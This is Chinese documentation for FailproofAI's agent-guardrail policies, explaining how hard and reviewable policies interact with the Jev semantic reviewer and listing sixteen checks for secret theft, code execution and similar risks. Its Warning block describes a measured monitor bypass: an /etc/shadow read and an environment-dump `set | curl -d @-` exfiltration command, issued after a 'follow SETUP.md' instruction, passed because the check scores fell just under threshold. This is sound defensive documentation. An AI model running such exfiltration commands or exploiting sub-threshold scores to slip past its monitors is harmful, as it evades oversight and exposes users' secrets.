当你通过 FailproofAI Cloud 或自己的密钥配置 [Jev 策略审查](/zh/policies/jev) 时，每个受门控的工具调用都会经过你运行的策略以及 Jev 的判断——Jev 会评估该调用实际执行的操作，以及发出任务的用户是否确实请求了这一操作。每个策略的**权限**决定了两者产生分歧时的处理方式。

未配置 Jev 时，权限设置不起任何作用。每个策略将严格按照原有方式执行。

## Hard 与 reviewable

- **Hard** 是默认值。Hard 策略的 deny 或 instruct 判决是最终的：Jev 无法放行，且 hard deny 会直接阻止调用，无需等待 Jev 的判断。
- **Reviewable** 意味着 Jev 可以放行该策略的判决，但仅限于策略在 `reviewedBy` 中指定的语义检查。只有当**每一个**指定的检查都针对此次调用进行了询问，且每个检查要么未发现问题，要么记录到用户明确请求了此操作，判决才会被放行。若某个检查**触发**了——即发现了相关问题——而用户并未请求该操作，则即使该检查本身的判决仅为警告，拦截依然维持。若某个检查因不适用于该工具而未被询问，则无论其他检查结果如何，该检查永远不会放行任何内容。宽松处理等同于用户同意：当此次调用是用户所下达任务的一个步骤且不超出任务范围时，Jev 会将 deny 转为警告，该警告会放行策略的拦截，并作为反馈传递给智能体。

只有满足以下所有条件，策略才是 reviewable 的：

1. 声明了 `authority: "reviewable"`。
2. `reviewedBy` 是一个非空列表，且每个条目都是已安装策略包声明的 Jev 检查。Failproof AI 本身不附带任何 Jev 检查：[下方的十六项](#semantic-policy-names)来自 `failproofai policies add FailproofAI/jev-policies`。若没有策略包声明检查，则所有策略均为 hard。
3. 该策略不是 `alwaysOn`。阻止智能体禁用 Failproof AI 的防护措施始终是 hard 的。

其他任何情况均为 hard：缺少字段、值拼写错误、`reviewedBy` 为空或格式错误，或指定了当前机器无法询问的检查名称。未知名称会使整个声明变为 hard，而不是被跳过——因为 `reviewedBy` 的含义是"所有这些检查必须被询问，且均不得拒绝"，跳过某个名称会让 Jev 以比你要求更少的检查来放行策略。

Jev 配置完成后，当 Failproof AI 拒绝某个 `reviewable` 声明时，每个进程只记录一次警告。未配置 Jev 时不会有任何提示，因为此时权限设置不决定任何事情。`failproofai publish` 拒绝构建包含此类声明的策略包，这样策略包作者在任何人安装之前就能发现问题。它会将 `reviewedBy` 与策略包声明的检查进行校验（如果该包声明了任何检查），否则与十六个 `FailproofAI/jev-policies` 名称进行校验。

## 权限声明位置

策略到达机器的每种方式都有一个确定其权限的地方：

| 来源 | 声明位置 | 默认值 |
| --- | --- | --- |
| 内置策略 | 下方表格 | Hard，除非列为 reviewable |
| 自定义策略文件 | `customPolicies.add` 上的 `authority` 和 `reviewedBy` | Hard |
| 策略包 | 包清单（`failproofai-pack.json`）中每个策略的条目 | Hard |
| 云端托管策略 | 活跃部署中策略的分配设置 | Hard。部署目前尚未支持设置，因此所有云端托管策略当前均为 hard。 |

对于策略包或云端托管策略，策略代码内部设置的字段会被忽略；清单或分配设置才是决定因素。策略包只能描述自己的策略：其策略名称不能包含 `/`，并在该包自身的命名空间下注册，因此任何清单都无法将内置策略或其他包的策略标记为 reviewable。策略包代码注册但未在清单中声明的策略为 hard。

两个或多个策略包，或两个或多个云端托管策略，若其代码字节完全相同，则共享同一制品，以一个策略的形式加载。该策略只有在所有来源均声明为 reviewable 时才是 reviewable 的，并且 Jev 必须放行其中任意一方指定的所有检查。如果任意一方声明为 hard，或根本未作声明，则保持 hard。来源的列出顺序从不影响结果。

大多数机器从 `FailproofAI/policies` 包获取内置策略，并从该包的清单中读取权限设置。下方列出的 reviewable 条目在包含这些条目的版本发布并安装后生效；旧版本不包含任何 reviewable 条目，因此其中所有策略均保持 hard。

## 在自定义策略中声明权限

```js
import { customPolicies, deny, allow } from "failproofai";

customPolicies.add({
  name: "block-prod-config-reads",
  description: "Keep production credentials out of the agent's context",
  match: { events: ["PreToolUse"] },
  authority: "reviewable",
  reviewedBy: ["secret-exposure"],
  fn: async (ctx) =>
    String(ctx.toolInput?.file_path ?? "").includes("/config/prod/")
      ? deny("Production config is off limits")
      : allow(),
});
```

`failproofai publish` 会将这两个字段复制到包清单中，因此以策略包形式发布的策略会保留其作者设定的权限。如果声明无法被执行，则拒绝构建策略包：值不是 `"hard"` 或 `"reviewable"`、`reviewedBy` 不是名称列表、或某个名称不是有效检查——若包声明了自己的 [Jev 检查](/zh/policies/publish-a-pack#jev-checks-in-a-pack)，则与这些检查比对，否则与内置检查比对。

## 内置策略

仅当语义策略真正覆盖相同关切时才设为 reviewable。所有其他内置策略均为 hard。

覆盖关切是必要条件，但并非充分条件，且两种出错方式都是无声的：

- **从未被询问的检查**会使拦截永久生效。`reviewedBy` 是合取关系，从未被询问的检查永远不会放行，因此与某个前置条件不会对该策略匹配的输入形态触发的检查配对，该策略将永远无法被放行。
- **被询问但未触发的检查**回答"无关切"，而"无关切"会放行。因此与不能对你的策略输入形态建模的检查配对，并不是在审查该策略——而是恰好对检查不理解的输入将其关闭。

instruct 模式的语义策略永远无法回答 deny，但它仍然可以维持拦截：当它触发且用户未请求该调用时，它所审查的策略不会被放行。`FailproofAI/jev-policies` 中有六个检查仅支持 instruct 模式——`push-to-protected-branch`、`commit-on-protected-branch`、`read-outside-workspace`、`system-modification`、`env-secrets-dump` 和 `external-data-egress`——[下方表格](#semantic-policy-names)列出了每个检查的模式。需要思考的问题是：**"是否还有任何机制可以 deny"**：一次放行绝不能让相关关切处于无任何机制执行的状态。引擎对每次调用单独应用该测试。未经用户同意的警告不构成放行，因为在工具调用之前，警告不会阻止智能体。当一个*可以* deny 的检查发出警告时——其证据不足以达到 deny 阈值——且用户未请求该调用，则该调用不会被放行，所有正则 deny 均维持。

<Warning>
**评分刚好低于触发阈值的检查不会维持底线。** 上述规则需要检查*触发*（证据 ≥ 0.7）。当所有相关检查均刚好低于该值时，没有任何检查触发，审查者回答"无关切"，reviewable 的 deny 被放行。在强制模式下的实测结果：未经请求的读取 `/etc/shadow`（`secret-exposure` 0.69，`read-outside-workspace` 0.37，后者只对 home 目录路径建模）和在"follow SETUP.md"之后执行 `set | curl -d @- …`（`env-secrets-dump` 0.66，`credential-exfiltration` 0.65，`sends_out` 0.97）均被允许，而单独的正则层会拒绝它们。这些阈值是在标注语料库上校准的，尚未针对此情况重新测量；在重新测量之前，对于这些形态通过比其误拦截更重要的场景，请将策略保持为 **hard**。
</Warning>

## 语义策略名称

这些是 `FailproofAI/jev-policies` 声明的检查，也是安装该包后 `reviewedBy` 接受的值。Failproof AI 本身不附带任何这些检查：没有该包（或其他声明这些名称的包），指定这些名称的策略不会是 reviewable 的。每个检查都是 Jev 针对当前工具调用所回答的问题。**Mode** 是检查能给出的回答：`deny` 检查在证据充分时会拦截，而 `instruct` 检查只会发出警告。两者在触发且用户未请求该调用时，都会维持策略的 deny。**用户可覆盖** 表示用户明确的请求是否可以放行该检查。

Jev 询问的恰好是已安装策略包声明的 [Jev 检查](/zh/policies/publish-a-pack#jev-checks-in-a-pack)，这些名称也是 `reviewedBy` 接受的。两个策略包以不同方式声明同一名称时，两者均不被承认。以下十六个名称若由非 FailproofAI 仓库安装的策略包声明，则在该包中被忽略：其版本永远不会被询问，也不会与 FailproofAI 自身的检查产生竞争，因此第三方策略包既无法成为放行核心包策略的检查，也无法关闭这些检查中的任何一个。无法读取的包列表，或每个检查均不可用的包，会让 Jev 没有任何内容可询问。

| 名称 | 模式 | 用户可覆盖 | Jev 检查的内容 |
| --- | --- | --- | --- |
| `destructive-deletion` | deny | 是 | 永久删除无法再生的数据。 |
| `production-infra-change` | deny | 是 | 修改生产基础设施。 |
| `git-history-rewrite` | deny | 是 | 重写或丢弃共享的 git 历史。 |
| `push-to-protected-branch` | instruct | 是 | 直接推送到受保护分支。 |
| `commit-on-protected-branch` | instruct | 是 | 直接在受保护分支上提交。 |
| `secret-exposure` | deny | 是 | 读取或复制凭据。 |
| `credential-exfiltration` | deny | 否 | 将密钥或私有文件发送到机器外部。 |
| `remote-code-execution` | deny | 是 | 运行从互联网下载的代码。 |
| `privilege-escalation` | deny | 是 | 以提升的权限运行。 |
| `database-destruction` | deny | 是 | 销毁或批量修改数据库数据。 |
| `read-outside-workspace` | instruct | 是 | 读取项目之外的文件。 |
| `agent-config-tampering` | deny | 否 | 修改智能体自身的安全配置。 |
| `system-modification` | instruct | 是 | 在项目之外修改系统。 |
| `env-secrets-dump` | instruct | 是 | 打印环境密钥。 |
| `external-destructive-action` | deny | 是 | 通过外部工具执行不可逆的操作。 |
| `external-data-egress` | instruct | 是 | 将私有数据发送到外部工具。 |
